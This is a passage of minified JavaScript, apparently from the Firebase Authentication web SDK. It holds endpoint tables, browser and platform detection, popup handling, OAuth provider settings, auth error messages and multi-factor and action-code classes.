      Pk(this), (this.mb = null), (a = this.nb(a));
      var c = this.qa.get(a);
      return (
        c || this.qa.set(a, (c = [])),
        c.push(b),
        (this.Na = Ja(this.Na) + 1),
        this
      );
    }),
      (Fk.prototype.remove = function (a) {
        return (
          Pk(this),
          (a = this.nb(a)),
          !!this.qa.has(a) &&
            ((this.mb = null),
            (this.Na = Ja(this.Na) - this.qa.get(a).length),
            this.qa.delete(a))
        );
      }),
      (Fk.prototype.clear = function () {
        (this.qa = this.mb = null), (this.Na = 0);
      }),
      (Fk.prototype.isEmpty = function () {
        return Pk(this), 0 == this.Na;
      });
    var Rk = function (a, b) {
      return Pk(a), (b = a.nb(b)), a.qa.has(b);
    };
    (k = Fk.prototype),
      (k.forEach = function (a, b) {
        Pk(this),
          this.qa.forEach(function (c, d) {
            c.forEach(function (e) {
              a.call(b, e, d, this);
            }, this);
          }, this);
      }),
      (k.Fg = function () {
        Pk(this);
        for (
          var a = Array.from(this.qa.values()),
            b = Array.from(this.qa.keys()),
            c = [],
            d = 0;
          d < b.length;
          d++
        )
          for (var e = a[d], f = 0; f < e.length; f++) c.push(b[d]);
        return c;
      }),
      (k.Lc = function (a) {
        Pk(this);
        var b = [];
        if ("string" == typeof a)
          Rk(this, a) && (b = b.concat(this.qa.get(this.nb(a))));
        else {
          a = Array.from(this.qa.values());
          for (var c = 0; c < a.length; c++) b = b.concat(a[c]);
        }
        return b;
      }),
      (k.set = function (a, b) {
        return (
          Pk(this),
          (this.mb = null),
          (a = this.nb(a)),
          Rk(this, a) && (this.Na = Ja(this.Na) - this.qa.get(a).length),
          this.qa.set(a, [b]),
          (this.Na = Ja(this.Na) + 1),
          this
        );
      }),
      (k.get = function (a, b) {
        return a && 0 < (a = this.Lc(a)).length ? String(a[0]) : b;
      }),
      (k.setValues = function (a, b) {
        this.remove(a),
          0 < b.length &&
            ((this.mb = null),
            this.qa.set(this.nb(a), Ua(b)),
            (this.Na = Ja(this.Na) + b.length));
      }),
      (k.toString = function () {
        if (this.mb) return this.mb;
        if (!this.qa) return "";
        for (
          var a = [], b = Array.from(this.qa.keys()), c = 0;
          c < b.length;
          c++
        ) {
          var d = b[c],
            e = encodeURIComponent(String(d));
          d = this.Lc(d);
          for (var f = 0; f < d.length; f++) {
            var g = e;
            "" !== d[f] && (g += "=" + encodeURIComponent(String(d[f]))),
              a.push(g);
          }
        }
        return (this.mb = a.join("&"));
      }),
      (k.clone = function () {
        var a = new Fk();
        return (
          (a.mb = this.mb),
          this.qa && ((a.qa = new Map(this.qa)), (a.Na = this.Na)),
          a
        );
      }),
      (k.nb = function (a) {
        return (a = String(a)), this.Ab && (a = a.toLowerCase()), a;
      }),
      (k.Bh = function (a) {
        a &&
          !this.Ab &&
          (Pk(this),
          (this.mb = null),
          this.qa.forEach(function (b, c) {
            var d = c.toLowerCase();
            c != d && (this.remove(c), this.setValues(d, b));
          }, this)),
          (this.Ab = a);
      }),
      (k.extend = function (a) {
        for (var b = 0; b < arguments.length; b++)
          xk(
            arguments[b],
            function (c, d) {
              this.add(d, c);
            },
            this
          );
      });
    var Sk = {
        Fm: {
          We: "https://staging-identitytoolkit.sandbox.googleapis.com/identitytoolkit/v3/relyingparty/",
          Lf: "https://staging-securetoken.sandbox.googleapis.com/v1/token",
          ff: "https://staging-identitytoolkit.sandbox.googleapis.com/v2/",
          id: "b",
        },
        Lm: {
          We: "https://www.googleapis.com/identitytoolkit/v3/relyingparty/",
          Lf: "https://securetoken.googleapis.com/v1/token",
          ff: "https://identitytoolkit.googleapis.com/v2/",
          id: "p",
        },
        Mm: {
          We: "https://staging-www.sandbox.googleapis.com/identitytoolkit/v3/relyingparty/",
          Lf: "https://staging-securetoken.sandbox.googleapis.com/v1/token",
          ff: "https://staging-identitytoolkit.sandbox.googleapis.com/v2/",
          id: "s",
        },
        Nm: {
          We: "https://www-googleapis-test.sandbox.google.com/identitytoolkit/v3/relyingparty/",
          Lf: "https://test-securetoken.sandbox.googleapis.com/v1/token",
          ff: "https://test-identitytoolkit.sandbox.googleapis.com/v2/",
          id: "t",
        },
      },
      Tk = function (a) {
        for (var b in Sk)
          if (Sk[b].id === a)
            return {
              firebaseEndpoint: (a = Sk[b]).We,
              secureTokenEndpoint: a.Lf,
              identityPlatformEndpoint: a.ff,
            };
        return null;
      },
      Uk;
    Uk = Tk("__EID__") ? "__EID__" : void 0;
    var angular,
      Wk = function () {
        var a = Vk();
        return (sc && !!Hc && 11 == Hc) || /Edge\/\d+/.test(a);
      },
      Xk = function () {
        return (
          (p.window && p.window.location.href) ||
          (self && self.location && self.location.href) ||
          ""
        );
      },
      Yk = function (a, b) {
        b = b || p.window;
        var c = "about:blank";
        a && (c = sb(hc(a))), (b.location.href = c);
      },
      Zk = function (a, b) {
        var d,
          c = [];
        for (d in a)
          d in b
            ? typeof a[d] != typeof b[d]
              ? c.push(d)
              : "object" == typeof a[d] && null != a[d] && null != b[d]
              ? 0 < Zk(a[d], b[d]).length && c.push(d)
              : a[d] !== b[d] && c.push(d)
            : c.push(d);
        for (var e in b) e in a || c.push(e);
        return c;
      },
      al = function () {
        var a = Vk();
        return (
          !(
            (a =
              "Chrome" != $k(a)
                ? null
                : (a = a.match(/\sChrome\/(\d+)/i)) && 2 == a.length
                ? parseInt(a[1], 10)
                : null) && 30 > a
          ) &&
          (!sc || !Hc || 9 < Hc)
        );
      },
      bl = function (a) {
        return !!(
          (a = (a || Vk()).toLowerCase()).match(/android/) ||
          a.match(/webos/) ||
          a.match(/iphone|ipad|ipod/) ||
          a.match(/blackberry/) ||
          a.match(/windows phone/) ||
          a.match(/iemobile/)
        );
      },
      cl = function (a) {
        a = a || p.window;
        try {
          a.close();
        } catch (b) {}
      },
      dl = function (a, b, c) {
        var d = Math.floor(1e9 * Math.random()).toString();
        (b = b || 500), (c = c || 600);
        var e = (window.screen.availHeight - c) / 2,
          f = (window.screen.availWidth - b) / 2;
        (b = {
          width: b,
          height: c,
          top: 0 < e ? e : 0,
          left: 0 < f ? f : 0,
          location: !0,
          resizable: !0,
          statusbar: !0,
          toolbar: !1,
        }),
          (c = Vk().toLowerCase()),
          d && ((b.target = d), z(c, "crios/") && (b.target = "_blank")),
          "Firefox" == $k(Vk()) &&
            ((a = a || "http://localhost"), (b.scrollbars = !0)),
          (e = a || ""),
          b || (b = {}),
          (a = window),
          (d =
            e instanceof rb ? e : hc(void 0 !== e.href ? e.href : String(e))),
          (f = void 0 !== self.crossOriginIsolated),
          (c = "strict-origin-when-cross-origin"),
          window.Request && (c = new Request("/").referrerPolicy);
        var g = "unsafe-url" === c;
        if (((c = b.noreferrer), f && c)) {
          if (g)
            throw Error(
              "Cannot use the noreferrer option on a page that sets a referrer-policy of `unsafe-url` in modern browsers!"
            );
          c = !1;
        }
        for (h in ((e = b.target || e.target), (f = []), b))
          switch (h) {
            case "width":
            case "height":
            case "top":
            case "left":
              f.push(h + "=" + b[h]);
              break;
            case "target":
            case "noopener":
            case "noreferrer":
              break;
            default:
              f.push(h + "=" + (b[h] ? 1 : 0));
          }
        var h = f.join(",");
        if (
          ((pc() || A("iPad") || A("iPod")) &&
          a.navigator &&
          a.navigator.standalone &&
          e &&
          "_self" != e
            ? ((h = Uc(document, "A")),
              oc(h, "A"),
              (d = d instanceof rb ? d : vb(d)),
              (h.href = sb(d)),
              (h.target = e),
              c && (h.rel = "noreferrer"),
              (d = document.createEvent("MouseEvent")).initMouseEvent(
                "click",
                !0,
                !0,
                a,
                1
              ),
              h.dispatchEvent(d),
              (h = {}))
            : c
            ? ((h = Nc("", a, e, h)),
              (a = sb(d)),
              h &&
                (uc && z(a, ";") && (a = "'" + a.replace(/'/g, "%27") + "'"),
                (h.opener = null),
                "" === a && (a = "javascript:''"),
                Db.test(a) &&
                  (-1 != a.indexOf("&") && (a = a.replace(xb, "&amp;")),
                  -1 != a.indexOf("<") && (a = a.replace(yb, "&lt;")),
                  -1 != a.indexOf(">") && (a = a.replace(zb, "&gt;")),
                  -1 != a.indexOf('"') && (a = a.replace(Ab, "&quot;")),
                  -1 != a.indexOf("'") && (a = a.replace(Bb, "&#39;")),
                  -1 != a.indexOf("\0") && (a = a.replace(Cb, "&#0;"))),
                (a =
                  '<meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0; url=' +
                  a +
                  '">'),
                Kc("b/12014412, meta tag with sanitized URL"),
                (a = Sb(a)),
                (d = h.document) && d.write && (d.write(Rb(a)), d.close())))
            : ((h = Nc(d, a, e, h)) && b.noopener && (h.opener = null),
              h && b.noreferrer && (h.opener = null)),
          h)
        )
          try {
            h.focus();
          } catch (l) {}
        return h;
      },
      el = function (a) {
        return new E(function (b) {
          var c = function () {
            ik(2e3).then(function () {
              if (a && !a.closed) return c();
              b();
            });
          };
          return c();
        });
      },
      gl = function (a, b) {
        var c = M(b);
        (b = c.Va), (c = c.Ga);
        for (var d = 0; d < a.length; d++) {
          var e = a[d];
          if (
            (0 == e.indexOf("chrome-extension://")
              ? (e = M(e).Ga == c && "chrome-extension" == b)
              : "http" != b && "https" != b
              ? (e = !1)
              : fl.test(e)
              ? (e = c == e)
              : ((e = e.split(".").join("\\.")),
                (e = new RegExp("^(.+\\." + e + "|" + e + ")$", "i").test(c))),
            e)
          )
            return !0;
        }
        return !1;
      },
      fl = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,
      hl = /^[^@]+@[^@]+$/,
      il = function () {
        var a = null;
        return new E(function (b) {
          "complete" == p.document.readyState
            ? b()
            : ((a = function () {
                b();
              }),
              mj(window, "load", a));
        }).l(function (b) {
          throw (vj(window, "load", a), b);
        });
      },
      kl = function () {
        return jl()
          ? il().then(function () {
              return new E(function (a, b) {
                var c = p.document,
                  d = setTimeout(function () {
                    b(Error("Cordova framework is not ready."));
                  }, 1e3);
                c.addEventListener(
                  "deviceready",
                  function () {
                    clearTimeout(d), a();
                  },
                  !1
                );
              });
            })
          : G(Error("Cordova must run in an Android or iOS file scheme."));
      },
      jl = function () {
        var a = Vk();
        return !(
          ("file:" !== ll() && "ionic:" !== ll()) ||
          !a.toLowerCase().match(/iphone|ipad|ipod|android/)
        );
      },
      ml = function () {
        var a = p.window;
        try {
          return !(!a || a == a.top);
        } catch (b) {
          return !1;
        }
      },
      nl = function () {
        return (
          void 0 !== p.WorkerGlobalScope && "function" == typeof p.importScripts
        );
      },
      ol = function () {
        return firebase.INTERNAL.hasOwnProperty("reactNative")
          ? "ReactNative"
          : firebase.INTERNAL.hasOwnProperty("node")
          ? "Node"
          : nl()
          ? "Worker"
          : "Browser";
      },
      pl = function () {
        var a = ol();
        return "ReactNative" === a || "Node" === a;
      },
      ql = function () {
        for (var a = 50, b = []; 0 < a; )
          b.push(
            "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
              Math.floor(62 * Math.random())
            )
          ),
            a--;
        return b.join("");
      },
      $k = function (a) {
        var b = a.toLowerCase();
        return z(b, "opera/") || z(b, "opr/") || z(b, "opios/")
          ? "Opera"
          : z(b, "iemobile")
          ? "IEMobile"
          : z(b, "msie") || z(b, "trident/")
          ? "IE"
          : z(b, "edge/")
          ? "Edge"
          : z(b, "firefox/")
          ? "Firefox"
          : z(b, "silk/")
          ? "Silk"
          : z(b, "blackberry")
          ? "Blackberry"
          : z(b, "webos")
          ? "Webos"
          : !z(b, "safari/") ||
            z(b, "chrome/") ||
            z(b, "crios/") ||
            z(b, "android")
          ? (!z(b, "chrome/") && !z(b, "crios/")) || z(b, "edge/")
            ? z(b, "android")
              ? "Android"
              : (a = a.match(RegExp("([a-zA-Z\\d\\.]+)/[a-zA-Z\\d\\.]*$"))) &&
                2 == a.length
              ? a[1]
              : "Other"
            : "Chrome"
          : "Safari";
      },
      rl = {
        DEFAULT: "FirebaseCore-web",
        Hm: "FirebaseUI-web",
        Km: "gcip-iap",
      },
      sl = function (a, b, c) {
        c = c || [];
        var f,
          d = [],
          e = {};
        for (f in rl) e[rl[f]] = !0;
        for (f = 0; f < c.length; f++)
          void 0 !== e[c[f]] && (delete e[c[f]], d.push(c[f]));
        return (
          d.sort(),
          (c = d).length || (c = ["FirebaseCore-web"]),
          ("Browser" === (d = ol())
            ? $k(Vk())
            : "Worker" === d
            ? $k(Vk()) + "-" + d
            : d) +
            "/" +
            a +
            "/" +
            b +
            "/" +
            c.join(",")
        );
      },
      Vk = function () {
        return (p.navigator && p.navigator.userAgent) || "";
      },
      N = function (a, b) {
        var c;
        for (
          a = a.split("."), b = b || p, c = 0;
          c < a.length && "object" == typeof b && null != b;
          c++
        )
          b = b[a[c]];
        return c != a.length && (b = void 0), b;
      },
      ul = function () {
        try {
          var a = p.localStorage,
            b = tl();
          if (a)
            return a.setItem(b, "1"), a.removeItem(b), !Wk() || !!p.indexedDB;
        } catch (c) {
          return nl() && !!p.indexedDB;
        }
        return !1;
      },
      wl = function () {
        return (
          (vl() || "chrome-extension:" === ll() || jl()) &&
          !pl() &&
          ul() &&
          !nl()
        );
      },
      vl = function () {
        return "http:" === ll() || "https:" === ll();
      },
      ll = function () {
        return (p.location && p.location.protocol) || null;
      },
      xl = function (a) {
        return (a = a || Vk()), !bl(a) && "Firefox" != $k(a);
      },
      yl = function (a) {
        return void 0 === a ? null : JSON.stringify(a);
      },
      zl = function (a) {
        var c,
          b = {};
        for (c in a)
          a.hasOwnProperty(c) &&
            null !== a[c] &&
            void 0 !== a[c] &&
            (b[c] = a[c]);
        return b;
      },
      Al = function (a) {
        if (null !== a) return JSON.parse(a);
      },
      tl = function (a) {
        return a || "" + Math.floor(1e9 * Math.random()).toString();
      },
      Bl = function (a) {
        return (
          (a = a || Vk()),
          "Safari" != $k(a) && !a.toLowerCase().match(/iphone|ipad|ipod/)
        );
      },
      Cl = function () {
        var a = p.___jsl;
        if (a && a.H)
          for (var b in a.H)
            if (
              ((a.H[b].r = a.H[b].r || []),
              (a.H[b].L = a.H[b].L || []),
              (a.H[b].r = a.H[b].L.concat()),
              a.CP)
            )
              for (var c = 0; c < a.CP.length; c++) a.CP[c] = null;
      },
      Dl = function (a, b) {
        if (a > b) throw Error("Short delay should be less than long delay!");
        (this.Lj = a),
          (this.zl = b),
          (a = Vk()),
          (b = ol()),
          (this.rl = bl(a) || "ReactNative" === b);
      };
    Dl.prototype.get = function () {
      var a = p.navigator;
      return !a ||
        "boolean" != typeof a.onLine ||
        (!vl() && "chrome-extension:" !== ll() && void 0 === a.connection) ||
        a.onLine
        ? this.rl
          ? this.zl
          : this.Lj
        : Math.min(5e3, this.Lj);
    };
    var El = function () {
        var a = p.document;
        return (
          !a || void 0 === a.visibilityState || "visible" == a.visibilityState
        );
      },
      Fl = function () {
        var a = p.document,
          b = null;
        return El() || !a
          ? F()
          : new E(function (c) {
              (b = function () {
                El() && (a.removeEventListener("visibilitychange", b, !1), c());
              }),
                a.addEventListener("visibilitychange", b, !1);
            }).l(function (c) {
              throw (a.removeEventListener("visibilitychange", b, !1), c);
            });
      },
      Gl = function (a) {
        "undefined" != typeof console &&
          "function" == typeof console.warn &&
          console.warn(a);
      },
      Hl = function (a) {
        try {
          var b = new Date(parseInt(a, 10));
          if (!isNaN(b.getTime()) && !/[^0-9]/.test(a)) return b.toUTCString();
        } catch (c) {}
        return null;
      },
      Il = function () {
        return !(!N("fireauth.oauthhelper", p) && !N("fireauth.iframe", p));
      },
      Jl = function () {
        var a = p.navigator;
        return (a && a.serviceWorker && a.serviceWorker.controller) || null;
      },
      Kl = function () {
        var a = p.navigator;
        return a && a.serviceWorker
          ? F()
              .then(function () {
                return a.serviceWorker.ready;
              })
              .then(function (b) {
                return b.active || null;
              })
              .l(function () {
                return null;
              })
          : F(null);
      },
      Ll = {},
      Ml = function (a) {
        Ll[a] || ((Ll[a] = !0), Gl(a));
      },
      Nl;
    try {
      var Ol = {};
      Object.defineProperty(Ol, "abcd", {
        configurable: !0,
        enumerable: !0,
        value: 1,
      }),
        Object.defineProperty(Ol, "abcd", {
          configurable: !0,
          enumerable: !0,
          value: 2,
        }),
        (Nl = 2 == Ol.abcd);
    } catch (a) {
      Nl = !1;
    }
    var O = function (a, b, c) {
        Nl
          ? Object.defineProperty(a, b, {
              configurable: !0,
              enumerable: !0,
              value: c,
            })
          : (a[b] = c);
      },
      Pl = function (a, b) {
        if (b) for (var c in b) b.hasOwnProperty(c) && O(a, c, b[c]);
      },
      Ql = function (a) {
        var b = {};
        return Pl(b, a), b;
      },
      Rl = function (a, b) {
        if (!b || !b.length) return !0;
        if (!a) return !1;
        for (var c = 0; c < b.length; c++) {
          var d = a[b[c]];
          if (null == d || "" === d) return !1;
        }
        return !0;
      },
      Sl = function (a) {
        var b = a;
        if ("object" == typeof a && null != a)
          for (var c in ((b = "length" in a ? [] : {}), a)) O(b, c, Sl(a[c]));
        return b;
      },
      Tl =
        "oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_timestamp oauth_token oauth_version".split(
          " "
        ),
      Ul = ["client_id", "response_type", "scope", "redirect_uri", "state"],
      Vl = {
        Gm: {
          he: "locale",
          zd: 700,
          yd: 600,
          providerId: "facebook.com",
          Gf: Ul,
        },
        Im: { he: null, zd: 500, yd: 750, providerId: "github.com", Gf: Ul },
        Jm: { he: "hl", zd: 515, yd: 680, providerId: "google.com", Gf: Ul },
        Om: { he: "lang", zd: 485, yd: 705, providerId: "twitter.com", Gf: Tl },
        Em: { he: "locale", zd: 640, yd: 600, providerId: "apple.com", Gf: [] },
      },
      Wl = function (a) {
        for (var b in Vl) if (Vl[b].providerId == a) return Vl[b];
        return null;
      },
      P = function (a, b, c) {
        (this.code = "auth/" + a),
          (this.message = b || Xl[a] || ""),
          (this.Dj = c || null);
      };
    v(P, Error),
      (P.prototype.T = function () {
        var a = { code: this.code, message: this.message };
        return this.Dj && (a.serverResponse = this.Dj), a;
      }),
      (P.prototype.toJSON = function () {
        return this.T();
      });
    var Yl = function (a) {
        var b = a && a.code;
        return b ? new P(b.substring(5), a.message, a.serverResponse) : null;
      },
      Xl = {
        "api-key-service-blocked":
          "The request is denied because it violates [API key HTTP restrictions](https://cloud.google.com/docs/authentication/api-keys#adding_http_restrictions).",
        "admin-restricted-operation":
          "This operation is restricted to administrators only.",
        "argument-error": "",
        "app-not-authorized":
          "This app, identified by the domain where it's hosted, is not authorized to use Firebase Authentication with the provided API key. Review your key configuration in the Google API console.",
        "app-not-installed":
          "The requested mobile application corresponding to the identifier (Android package name or iOS bundle ID) provided is not installed on this device.",
        "bad-request": "The requested action is invalid.",
        "captcha-check-failed":
          "The reCAPTCHA response token provided is either invalid, expired, already used or the domain associated with it does not match the list of whitelisted domains.",
        "code-expired":
          "The SMS code has expired. Please re-send the verification code to try again.",
        "cordova-not-ready": "Cordova framework is not ready.",
        "cors-unsupported": "This browser is not supported.",
        "credential-already-in-use":
          "This credential is already associated with a different user account.",
        "custom-token-mismatch":
          "The custom token corresponds to a different audience.",
        "requires-recent-login":
          "This operation is sensitive and requires recent authentication. Log in again before retrying this request.",
        "dynamic-link-not-activated":
          "Please activate Dynamic Links in the Firebase Console and agree to the terms and conditions.",
        "email-change-needs-verification":
          "Multi-factor users must always have a verified email.",
        "email-already-in-use":
          "The email address is already in use by another account.",
        "expired-action-code": "The action code has expired. ",
        "cancelled-popup-request":
          "This operation has been cancelled due to another conflicting popup being opened.",
        "internal-error": "An internal error has occurred.",
        "invalid-app-credential":
          "The phone verification request contains an invalid application verifier. The reCAPTCHA token response is either invalid or expired.",
        "invalid-app-id":
          "The mobile app identifier is not registed for the current project.",
        "invalid-user-token":
          "This user's credential isn't valid for this project. This can happen if the user's token has been tampered with, or if the user isn't for the project associated with this API key.",
        "invalid-auth-event": "An internal error has occurred.",
        "invalid-verification-code":
          "The SMS verification code used to create the phone auth credential is invalid. Please resend the verification code sms and be sure to use the verification code provided by the user.",
        "invalid-continue-uri":
          "The continue URL provided in the request is invalid.",
        "invalid-cordova-configuration":
          "The following Cordova plugins must be installed to enable OAuth sign-in: cordova-plugin-buildinfo, cordova-universal-links-plugin, cordova-plugin-browsertab, cordova-plugin-inappbrowser and cordova-plugin-customurlscheme.",
        "invalid-custom-token":
          "The custom token format is incorrect. Please check the documentation.",
        "invalid-dynamic-link-domain":
          "The provided dynamic link domain is not configured or authorized for the current project.",
        "invalid-email": "The email address is badly formatted.",
        "invalid-api-key":
          "Your API key is invalid, please check you have copied it correctly.",
        "invalid-cert-hash": "The SHA-1 certificate hash provided is invalid.",
        "invalid-credential":
          "The supplied auth credential is malformed or has expired.",
        "invalid-message-payload":
          "The email template corresponding to this action contains invalid characters in its message. Please fix by going to the Auth email templates section in the Firebase Console.",
        "invalid-multi-factor-session":
          "The request does not contain a valid proof of first factor successful sign-in.",
        "invalid-oauth-provider":
          "EmailAuthProvider is not supported for this operation. This operation only supports OAuth providers.",
        "invalid-oauth-client-id":
          "The OAuth client ID provided is either invalid or does not match the specified API key.",
        "unauthorized-domain":
          "This domain is not authorized for OAuth operations for your Firebase project. Edit the list of authorized domains from the Firebase console.",
        "invalid-action-code":
          "The action code is invalid. This can happen if the code is malformed, expired, or has already been used.",
        "wrong-password":
          "The password is invalid or the user does not have a password.",
        "invalid-persistence-type":
          "The specified persistence type is invalid. It can only be local, session or none.",
        "invalid-phone-number":
          "The format of the phone number provided is incorrect. Please enter the phone number in a format that can be parsed into E.164 format. E.164 phone numbers are written in the format [+][country code][subscriber number including area code].",
        "invalid-provider-id": "The specified provider ID is invalid.",
        "invalid-recipient-email":
          "The email corresponding to this action failed to send as the provided recipient email address is invalid.",
        "invalid-sender":
          "The email template corresponding to this action contains an invalid sender email or name. Please fix by going to the Auth email templates section in the Firebase Console.",
        "invalid-verification-id":
          "The verification ID used to create the phone auth credential is invalid.",
        "invalid-tenant-id": "The Auth instance's tenant ID is invalid.",
        "multi-factor-info-not-found":
          "The user does not have a second factor matching the identifier provided.",
        "multi-factor-auth-required":
          "Proof of ownership of a second factor is required to complete sign-in.",
        "missing-android-pkg-name":
          "An Android Package Name must be provided if the Android App is required to be installed.",
        "auth-domain-config-required":
          "Be sure to include authDomain when calling firebase.initializeApp(), by following the instructions in the Firebase console.",
        "missing-app-credential":
          "The phone verification request is missing an application verifier assertion. A reCAPTCHA response token needs to be provided.",
        "missing-verification-code":
          "The phone auth credential was created with an empty SMS verification code.",
        "missing-continue-uri":
          "A continue URL must be provided in the request.",
        "missing-iframe-start": "An internal error has occurred.",
        "missing-ios-bundle-id":
          "An iOS Bundle ID must be provided if an App Store ID is provided.",
        "missing-multi-factor-info": "No second factor identifier is provided.",
        "missing-multi-factor-session":
          "The request is missing proof of first factor successful sign-in.",
        "missing-or-invalid-nonce":
          "The request does not contain a valid nonce. This can occur if the SHA-256 hash of the provided raw nonce does not match the hashed nonce in the ID token payload.",
        "missing-phone-number":
          "To send verification codes, provide a phone number for the recipient.",
        "missing-verification-id":
          "The phone auth credential was created with an empty verification ID.",
        "app-deleted": "This instance of FirebaseApp has been deleted.",
        "account-exists-with-different-credential":
          "An account already exists with the same email address but different sign-in credentials. Sign in using a provider associated with this email address.",
        "network-request-failed":
          "A network error (such as timeout, interrupted connection or unreachable host) has occurred.",
        "no-auth-event": "An internal error has occurred.",
        "no-such-provider":
          "User was not linked to an account with the given provider.",
        "null-user":
          "A null user object was provided as the argument for an operation which requires a non-null user object.",
        "operation-not-allowed":
          "The given sign-in provider is disabled for this Firebase project. Enable it in the Firebase console, under the sign-in method tab of the Auth section.",
        "operation-not-supported-in-this-environment":
          'This operation is not supported in the environment this application is running on. "location.protocol" must be http, https or chrome-extension and web storage must be enabled.',
        "password-does-not-meet-requirements":
          "The provided password does not meet the configured requirements.",
        "popup-blocked":
          "Unable to establish a connection with the popup. It may have been blocked by the browser.",
        "popup-closed-by-user":
          "The popup has been closed by the user before finalizing the operation.",
        "provider-already-linked":
          "User can only be linked to one identity for the given provider.",
        "quota-exceeded":
          "The project's quota for this operation has been exceeded.",
        "redirect-cancelled-by-user":
          "The redirect operation has been cancelled by the user before finalizing.",
        "redirect-operation-pending":
          "A redirect sign-in operation is already pending.",
        "rejected-credential":
          "The request contains malformed or mismatching credentials.",
        "second-factor-already-in-use":
          "The second factor is already enrolled on this account.",
        "maximum-second-factor-count-exceeded":
          "The maximum allowed number of second factors on a user has been exceeded.",
        "tenant-id-mismatch":
          "The provided tenant ID does not match the Auth instance's tenant ID",
        timeout: "The operation has timed out.",
        "user-token-expired":
          "The user's credential is no longer valid. The user must sign in again.",
        "too-many-requests":
          "We have blocked all requests from this device due to unusual activity. Try again later.",
        "unauthorized-continue-uri":
          "The domain of the continue URL is not whitelisted.  Please whitelist the domain in the Firebase console.",
        "unsupported-first-factor":
          "Enrolling a second factor or signing in with a multi-factor account requires sign-in with a supported first factor.",
        "unsupported-persistence-type":
          "The current environment does not support the specified persistence type.",
        "unsupported-tenant-operation":
          "This operation is not supported in a multi-tenant context.",
        "unverified-email": "The operation requires a verified email.",
        "user-cancelled":
          "The user did not grant your application the permissions it requested.",
        "user-not-found":
          "There is no user record corresponding to this identifier. The user may have been deleted.",
        "user-disabled":
          "The user account has been disabled by an administrator.",
        "user-mismatch":
          "The supplied credentials do not correspond to the previously signed in user.",
        "user-signed-out": "",
        "weak-password": "The password must be 6 characters long or more.",
        "web-storage-unsupported":
          "This browser is not supported or 3rd party cookies and data may be disabled.",
      },
      Zl = function (a, b, c, d, e, f, g) {
        if (
          ((this.Mh = a),
          (this.Ja = b || null),
          (this.Ld = c || null),
          (this.ye = d || null),
          (this.jh = f || null),
          (this.ma = g || null),
          (this.yb = e || null),
          !this.Ld && !this.yb)
        )
          throw new P("invalid-auth-event");
        if (this.Ld && this.yb) throw new P("invalid-auth-event");
        if (this.Ld && !this.ye) throw new P("invalid-auth-event");
      };
    (k = Zl.prototype),
      (k.getType = function () {
        return this.Mh;
      }),
      (k.getUid = function () {
        var a = [];
        return (
          a.push(this.Mh),
          this.Ja && a.push(this.Ja),
          this.ye && a.push(this.ye),
          this.ma && a.push(this.ma),
          a.join("-")
        );
      }),
      (k.ae = function () {
        return this.ye;
      }),
      (k.getError = function () {
        return this.yb;
      }),
      (k.T = function () {
        return {
          type: this.Mh,
          eventId: this.Ja,
          urlResponse: this.Ld,
          sessionId: this.ye,
          postBody: this.jh,
          tenantId: this.ma,
          error: this.yb && this.yb.T(),
        };
      });
    var $l = function (a) {
        return (a = a || {}).type
          ? new Zl(
              a.type,
              a.eventId,
              a.urlResponse,
              a.sessionId,
              a.error && Yl(a.error),
              a.postBody,
              a.tenantId
            )
          : null;
      },
      am = function (a, b) {
        if (!b || !a || !a.mfaEnrollmentId)
          throw new P(
            "internal-error",
            "Internal assert: invalid MultiFactorInfo object"
          );
        O(this, "uid", a.mfaEnrollmentId),
          O(this, "displayName", a.displayName || null),
          O(
            this,
            "enrollmentTime",
            a.enrolledAt ? new Date(a.enrolledAt).toUTCString() : null
          ),
          O(this, "factorId", b);
      };
    am.prototype.T = function () {
      return {
        uid: this.uid,
        displayName: this.displayName,
        factorId: this.factorId,
        enrollmentTime: this.enrollmentTime,
      };
    };
    var dm = function (a) {
        try {
          if (a.phoneInfo) return new bm(a);
          if (a.totpInfo) return new cm(a);
        } catch (b) {}
        return null;
      },
      bm = function (a) {
        var b = a.phoneInfo;
        if (!b)
          throw new P(
            "internal-error",
            "Internal assert: invalid Phone MultiFactorInfo object"
          );
        am.call(this, a, "phone"), O(this, "phoneNumber", b);
      };
    n(bm, am),
      (bm.prototype.T = function () {
        var a = am.prototype.T.call(this);
        return (a.phoneNumber = this.phoneNumber), a;
      });
    var cm = function (a) {
      var b = a.totpInfo;
      if (!b)
        throw new P(
          "internal-error",
          "Internal assert: invalid TOTP MultiFactorInfo object"
        );
      am.call(this, a, "totp"), O(this, "totpInfo", b);
    };
    n(cm, am),
      (cm.prototype.T = function () {
        var a = am.prototype.T.call(this);
        return (a.totpInfo = this.totpInfo), a;
      });
    var em = function (a) {
        var b = {},
          c = a.email,
          d = a.newEmail,
          e = a.requestType;
        if (
          ((a = dm(a.mfaInfo)),
          !e ||
            ("EMAIL_SIGNIN" != e && "VERIFY_AND_CHANGE_EMAIL" != e && !c) ||
            ("VERIFY_AND_CHANGE_EMAIL" == e && !d) ||
            ("REVERT_SECOND_FACTOR_ADDITION" == e && !a))
        )
          throw Error("Invalid checkActionCode response!");
        "VERIFY_AND_CHANGE_EMAIL" == e
          ? ((b.fromEmail = c || null),
            (b.previousEmail = c || null),
            (b.email = d))
          : ((b.fromEmail = d || null),
            (b.previousEmail = d || null),
            (b.email = c || null)),
          (b.multiFactorInfo = a || null),
          O(this, "operation", e),
          O(this, "data", Sl(b));
      },
      gm = function (a) {
        a = M(a);
        var b = Mk(a, "apiKey") || null,
          c = Mk(a, "oobCode") || null,
          d = Mk(a, "mode") || null;
        if (((d = (d && fm[d]) || null), !b || !c || !d))
          throw new P(
            "argument-error",
            "apiKey, oobCodeand mode are required in a valid action code URL."
          );
        Pl(this, {
          apiKey: b,
          operation: d,
          code: c,
          continueUrl: Mk(a, "continueUrl") || null,
          languageCode: Mk(a, "languageCode") || null,
          tenantId: Mk(a, "tenantId") || null,
        });
      },
      hm = function (a) {
        try {
          return new gm(a);
        } catch (b) {
          return null;
        }
      },
      fm = {
        recoverEmail: "RECOVER_EMAIL",
        resetPassword: "PASSWORD_RESET",
        revertSecondFactorAddition: "REVERT_SECOND_FACTOR_ADDITION",
        signIn: "EMAIL_SIGNIN",
        verifyAndChangeEmail: "VERIFY_AND_CHANGE_EMAIL",
        verifyEmail: "VERIFY_EMAIL",
      },
      im = function (a) {
        var b = M(a),
          c = Mk(b, "link"),
          d = Mk(M(c), "link");
        return (
